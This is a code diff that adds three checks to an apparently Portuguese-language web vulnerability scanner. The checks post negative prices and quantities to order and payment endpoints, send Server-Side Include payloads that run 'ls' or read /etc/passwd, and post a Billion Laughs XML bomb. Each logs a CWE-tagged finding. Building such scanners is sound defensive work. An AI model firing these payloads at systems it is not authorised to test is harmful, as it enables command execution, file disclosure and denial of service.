@@ -1446,6 +1446,69 @@ class MegaVulnerabilityScanner:
                     "Use apenas ciphers fortes (TLS 1.2+)", "CWE-327"))
         return results
 
+    async def test_business_logic_bypass(self, target: str, scan_id: str) -> List[Dict]:
+        """Business Logic Bypass"""
+        results = []
+        # Test negative prices/quantities
+        endpoints = ['/api/cart', '/api/order', '/api/payment', '/api/purchase']
+        payloads = ['{"price":-100}', '{"quantity":-5}', '{"amount":-1000}']
+        headers = {"Content-Type": "application/json"}
+        
+        for ep in endpoints:
+            url = target.rstrip('/') + ep
+            for payload in payloads:
+                r = await self.make_request(url, method="POST", headers=headers, data=payload)
+                if r["status_code"] in [200, 201, 202]:
+                    results.append(self.vuln(scan_id, "critical", "Business Logic Bypass",
+                        f"Endpoint {ep} aceita valores negativos", "Business Logic", url,
+                        payload, "Valores negativos aceitos sem validação",
+                        "Valide lógica de negócio e valores negativos", "CWE-840"))
+                    return results
+        return results
+
+    async def test_server_side_includes(self, target: str, scan_id: str) -> List[Dict]:
+        """Server-Side Includes (SSI) Injection"""
+        results = []
+        payloads = [
+            "<!--#exec cmd='ls' -->",
+            "<!--#include virtual='/etc/passwd' -->",
+            "<!--#echo var='DATE_LOCAL' -->",
+        ]
+        params = ['page', 'template', 'file', 'include']
+        
+        for param in params:
+            for p in payloads:
+                url = f"{target}{'&' if '?' in target else '?'}{param}={urllib.parse.quote(p)}"
+                r = await self.make_request(url)
+                if any(indicator in r.get("body", "").lower() for indicator in ["root:", "bin/bash", "monday", "tuesday"]):
+                    results.append(self.vuln(scan_id, "high", "Server-Side Includes Injection",
+                        f"Parâmetro '{param}' vulnerável a SSI", "Injection", url,
+                        p, "SSI executado", "Desabilite SSI ou valide entrada", "CWE-97"))
+                    return results
+        return results
+
+    async def test_xml_external_entity_advanced(self, target: str, scan_id: str) -> List[Dict]:
+        """XXE Advanced - Billion Laughs"""
+        results = []
+        # Billion Laughs attack (XML bomb)
+        xxe_bomb = '''<?xml version="1.0"?>
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+]>
+<lolz>&lol3;</lolz>'''
+        
+        headers = {"Content-Type": "application/xml"}
+        r = await self.make_request(target, method="POST", headers=headers, data=xxe_bomb)
+        
+        if r["status_code"] == 500 or "memory" in r.get("body", "").lower() or "timeout" in r.get("body", "").lower():
+            results.append(self.vuln(scan_id, "high", "XXE - XML Bomb (Billion Laughs)",
+                "Servidor vulnerável a ataque de XML Bomb", "Injection", target,
+                xxe_bomb[:100], "Servidor processou XML malicioso",
+                "Desabilite entidades externas e limite expansão XML", "CWE-776"))
+        return results
+
     # ==================== MAIN SCAN ====================
 
     async def scan_target(self, scan_id: str, target: str, scan_type: str, status_callback=None) -> List[Dict]:
